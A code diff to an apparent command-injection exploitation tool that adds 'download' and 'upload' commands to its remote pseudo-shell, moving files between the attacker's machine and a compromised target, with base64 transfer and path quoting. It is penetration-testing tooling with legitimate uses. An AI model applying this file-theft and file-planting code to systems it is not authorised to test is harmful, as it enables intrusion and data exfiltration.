@@ -19,6 +19,7 @@ import os
 import sys
 import json
 import time
+import shlex
 import socket
 import random
 import string
@@ -1133,7 +1134,7 @@ def confirmed_injection_points_summary():
 Check 'os_shell' options
 """
 def check_os_shell_options(cmd, filename, url):
-  if cmd in settings.SHELL_OPTIONS or cmd.split(" ", 1)[0] == "use":
+  if cmd in settings.SHELL_OPTIONS or cmd.split(" ", 1)[0] in ("use", "download", "upload"):
     if cmd == "?":
       menu.os_shell_options()
     elif cmd == "back":
@@ -2889,7 +2890,7 @@ def write_content(content, dest_to_write):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     cmd = settings.WIN_FILE_WRITE_OPERATOR  + dest_to_write.replace("\\","\\\\") + settings.SINGLE_WHITESPACE + "'" + content + "'"
   else:
-    cmd = settings.FILE_WRITE + content + settings.FILE_WRITE_OPERATOR + dest_to_write
+    cmd = settings.FILE_WRITE + content + settings.FILE_WRITE_OPERATOR + quoted_cmd(dest_to_write)
   return cmd
 
 """
@@ -2906,15 +2907,15 @@ def check_file(remote_file_path):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     cmd = settings.FILE_LIST_WIN + remote_file_path.replace("\\","\\\\")
   else:
-    cmd = settings.FILE_LIST + remote_file_path
+    cmd = settings.FILE_LIST + quoted_cmd(remote_file_path)
     cmd = add_command_substitution(cmd)
   return cmd
 
 """
 File content to read.
 """
-def file_content_to_read():
-  file_to_read = menu.options.file_read
+def file_content_to_read(file_to_read=None):
+  file_to_read = file_to_read or menu.options.file_read
   info_msg = "Fetching contents of the file: '"
   info_msg += file_to_read + "'."
   settings.print_data_to_stdout(settings.print_info_msg(info_msg))
@@ -2960,8 +2961,8 @@ def file_read_status(shell, file_to_read, filename):
 """
 Build the final destination path for file write operations.
 """
-def check_destination(destination):
-  where = menu.options.file_write
+def check_destination(destination, where=None):
+  where = where or menu.options.file_write
   # Normalize path separators before splitting.
   normalized = destination.replace("\\", "/")
   # A destination with no trailing filename is a directory, so append the local filename.
@@ -2974,8 +2975,8 @@ def check_destination(destination):
 """
 Write the content of a local file to a remote destination.
 """
-def check_file_to_write():
-  file_to_write = menu.options.file_write
+def check_file_to_write(file_to_write=None, dest=None):
+  file_to_write = file_to_write or menu.options.file_write
   if not os.path.exists(file_to_write):
     err_msg = "The specified local file '" + file_to_write + "' does not exist."
     settings.print_data_to_stdout(settings.print_critical_msg(err_msg))
@@ -3002,7 +3003,7 @@ def check_file_to_write():
     settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
     raise SystemExit()
 
-  dest_to_write = check_destination(destination=menu.options.file_dest)
+  dest_to_write = check_destination(destination=dest or menu.options.file_dest, where=file_to_write)
   info_msg = "Attempting to write the contents of file '"
   info_msg += file_to_write + "' to the remote directory '" + dest_to_write + "'."
   settings.print_data_to_stdout(settings.print_info_msg(info_msg))
@@ -3022,6 +3023,111 @@ def file_write_status(shell, dest_to_write):
 
 
 """
+Write a local file to the target, through the given execute_cmd(cmd) -> output callback.
+"""
+def upload_file(execute_cmd, file_to_write, dest_to_write, content):
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    fname, tmp_fname, cmd = find_filename(dest_to_write, content)
+    execute_cmd(cmd)
+    execute_cmd(win_decode_b64_enc(fname, tmp_fname))
+    execute_cmd(delete_tmp(tmp_fname))
+    shell = execute_cmd(check_file(dest_to_write))
+  else:
+    execute_cmd(write_content(content, dest_to_write))
+    shell = execute_cmd(remove_command_substitution(check_file(dest_to_write)))
+  file_write_status(shell, dest_to_write)
+
+"""
+Read a file from the target, through the given execute_cmd(cmd) -> output callback.
+"""
+def download_file(execute_cmd, file_to_read, filename):
+  cmd, file_to_read = file_content_to_read(file_to_read)
+  shell = execute_cmd(remove_command_substitution(cmd))
+  file_read_status(shell, file_to_read, filename)
+  return shell
+
+"""
+Split an interactive "download"/"upload" command into its two path arguments.
+"""
+def shell_transfer_args(cmd, usage):
+  try:
+    args = shlex.split(cmd)[1:]
+  except ValueError:
+    args = cmd.split()[1:]
+  if len(args) != 2:
+    settings.print_data_to_stdout(settings.print_error_msg("Usage: " + usage))
+    return None, None
+  return args[0], args[1]
+
+"""
+Read a file from the target as base64, so its exact bytes survive the transfer - returns None
+when the target cannot produce it (no "base64" available, unreadable file, ...).
+"""
+def download_file_bytes(execute_cmd, remote_file):
+  if settings.TARGET_OS == settings.OS.WINDOWS:
+    cmd = settings.WIN_FILE_READ_B64.format(remote_file.replace("\\", "\\\\"))
+  else:
+    cmd = settings.FILE_READ_B64 + quoted_cmd(remote_file)
+  encoded = execute_cmd(cmd)
+  if not encoded:
+    return None
+  try:
+    return base64.b64decode("".join(str(encoded).split()), validate=True)
+  except Exception:
+    return None
+
+"""
+Download a file from the target host to the local machine ("download <remote> <local>").
+"""
+def shell_download(execute_cmd, cmd, filename):
+  remote_file, local_file = shell_transfer_args(cmd, "download /path/to/remote/file /path/to/local/file")
+  if not remote_file:
+    return
+  if os.path.isdir(local_file):
+    local_file = os.path.join(local_file, os.path.basename(remote_file.replace("\\", "/").rstrip("/")))
+
+  info_msg = "Fetching contents of the file: '" + remote_file + "'."
+  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
+
+  content = download_file_bytes(execute_cmd, remote_file)
+  if content is None:
+    # No usable base64 on the target - fall back to a plain read, which the command output
+    # channel returns as a single whitespace-separated line.
+    warn_msg = "Unable to retrieve '" + remote_file + "' as base64. Falling back to a plain read, "
+    warn_msg += "which does not preserve the file's original formatting."
+    settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
+    text = download_file(execute_cmd, remote_file, filename)
+    if not text:
+      return
+    content = str(text).encode(settings.DEFAULT_CODEC, errors="replace")
+
+  try:
+    with open(local_file, "wb") as output_file:
+      output_file.write(content)
+  except OSError as err:
+    err_msg = "Unable to write the local file '" + local_file + "' (" + str(err) + ")."
+    settings.print_data_to_stdout(settings.print_error_msg(err_msg))
+    return
+
+  logs.report_add_file(remote_file, local_file)
+  info_msg = "The file '" + remote_file + "' has been successfully downloaded to '" + local_file
+  info_msg += "' (" + str(len(content)) + " bytes)."
+  settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
+
+"""
+Upload a file from the local machine to the target host ("upload <local> <remote>").
+"""
+def shell_upload(execute_cmd, cmd):
+  local_file, remote_file = shell_transfer_args(cmd, "upload /path/to/local/file /path/to/remote/file")
+  if not local_file:
+    return
+  try:
+    file_to_write, dest_to_write, content = check_file_to_write(local_file, remote_file)
+  except SystemExit:
+    return
+  upload_file(execute_cmd, file_to_write, dest_to_write, content)
+
+"""
 Run the standard file-access checks via the given execute_cmd(cmd) -> output callback - the shared logic behind any module's own file-access entry point (see shellshock.py).
 """
 def run_file_access(execute_cmd, filename):
@@ -3030,15 +3136,11 @@ def run_file_access(execute_cmd, filename):
   if menu.options.file_write:
     ran = True
     file_to_write, dest_to_write, content = check_file_to_write()
-    execute_cmd(write_content(content, dest_to_write))
-    shell = execute_cmd(remove_command_substitution(check_file(dest_to_write)))
-    file_write_status(shell, dest_to_write)
+    upload_file(execute_cmd, file_to_write, dest_to_write, content)
 
   if menu.options.file_read:
     ran = True
-    cmd, file_to_read = file_content_to_read()
-    shell = execute_cmd(remove_command_substitution(cmd))
-    file_read_status(shell, file_to_read, filename)
+    download_file(execute_cmd, None, filename)
 
   if ran:
     settings.FILE_ACCESS_DONE = True
